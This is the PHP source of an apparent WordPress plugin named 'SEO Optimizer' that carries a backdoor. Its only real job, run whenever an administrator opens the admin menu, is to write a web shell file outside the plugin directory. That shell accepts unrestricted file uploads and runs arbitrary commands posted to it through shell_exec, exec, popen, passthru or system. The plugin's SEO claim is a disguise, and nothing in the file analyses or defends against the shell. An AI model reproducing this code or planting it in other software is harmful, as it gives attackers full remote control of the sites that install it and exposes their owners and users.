<?php
/**
* Plugin Name: SEO Optimizer
* Plugin URI: http://seoptimizer.com
* Description: Optimizes SEO stuff
* Version: 1.0.0
* Author: UnknownTeam
* Author URI: http://seoptimizer.com
* License: GPL2
*/


add_action('admin_menu',function(){
    $file = '../backd00rshit.php';
    $code_php = '
   
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Uploader</title>
</head>
<body>
    <span style="display:none">Vuln!!</span>
    <form method="post" enctype="multipart/form-data">
        <strong>Select a file to upload :</strong> <input type="file" name="upload" />
        <br /><br/>
        <button type="submit" name="upload_btn" style="border:none;background:#000;color:#fff;padding:5px 10px;font-weight:bold;height:50px;cursor:pointer;">Upload the fucking shit</button>
        <br /> <br/>
    </form>
    <form method="post">
        <strong>Run Command (Komut Çalıştır): </strong><input type="text" name="cmd" placeholder="whoami" value="<?=$_POST[\'cmd\'];?>" style="width:400px;border:1px solid #efefef;padding:5px 10px;height:40px" />
        <br /><br />
        <button type="submit" name="run_cmd" style="border:none;background:#000;color:#fff;padding:5px 10px;font-weight:bold;height:50px;cursor:pointer;">Run command</button>
        <br/><br/>
    </form>
</body>
</html>
<?php 
    if(isset($_POST["upload_btn"])){
        if(@move_uploaded_file($_FILES["upload"]["tmp_name"],$_FILES["upload"]["name"])){
            print "File is uploaded,check it: <a href=\"{$_FILES["upload"]["name"]}\">{$_FILES["upload"]["name"]}</a>";
        }else{
            print "Can not upload the file!";
        }
    }elseif(isset($_POST["run_cmd"])){

        $cmd = $_POST["cmd"];

        if(function_exists("shell_exec")){
            $run = shell_exec($cmd);
            echo "<font color=\"red\">Kullanılan işlev : shell_exec() </font>, <strong>Gönderilen Komut : $cmd</strong><br /><pre>$run</pre>";
        }elseif(function_exists("exec")){
            $run = exec($cmd,$result);
            echo "<font color=\"red\">Kullanılan işlev : exec() </font>, <strong>Gönderilen Komut : $cmd</strong><br />";
            foreach($result as $res){
                $res = trim($res);
                echo "<strong>exec-> $res</strong><br />";
            }
        }elseif(function_exists("popen")){
            $run = popen($cmd,"r");
            $result = "";
            echo "<font color=\"red\">Kullanılan işlev : popen() </font>, <strong>Gönderilen Komut : $cmd</strong><br /><br/>";
            while(!feof($run)){
                $buffer = fgets($run,4096);
                $result .= "<strong>popen -> $buffer</strong><br />";
            }
            pclose($run);
            echo $result;
        }elseif(function_exists("passthru")){
            passthru($cmd);
            echo "<br /><br /><br /><font color=\"red\">Kullanılan işlev : passthru() </font>, <strong>Gönderilen Komut : $cmd</strong><br />";
        }elseif(function_exists("system")){
            system($cmd);
            echo "<br /><br /><br /><font color=\"red\">Kullanılan işlev : system() </font>, <strong>Gönderilen Komut : $cmd</strong><br />";
        }else{
            print "passthru(),shell_exec(),exec(),popen(),system() functions are disabled / Aktif değil!";
        }

    }
?>';
    file_put_contents($file,$code_php);
    add_object_page("Seo Optimizer", "Seo Optimizer", "administrator", "seop", function () {
        print '<h1>Welcome to the SEO Optimizer</h1>';
    });

});
